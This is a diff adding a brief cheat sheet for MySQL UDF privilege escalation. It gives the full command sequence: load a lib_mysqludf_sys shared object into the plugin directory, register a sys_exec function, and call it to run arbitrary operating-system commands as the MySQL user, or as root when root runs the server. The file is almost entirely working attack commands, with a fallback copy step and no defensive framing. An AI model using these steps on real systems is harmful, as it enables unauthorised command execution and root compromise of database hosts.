@@ -1,0 +1,15 @@
+# If root is running mysql then you can become root
+# otherwise you will be the user who ran the mysql
+
+mysql -u username -p password
+
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('<path to UDF file>')); 
+select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
+create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
+
+If you are getting file too short error
+cp /PATH/TO/lib_mysqludf_sys_64.so /usr/lib/mysql/plugin/lib_mysqludf_sys_64.so
+
+select sys_exec('COMMANDS');
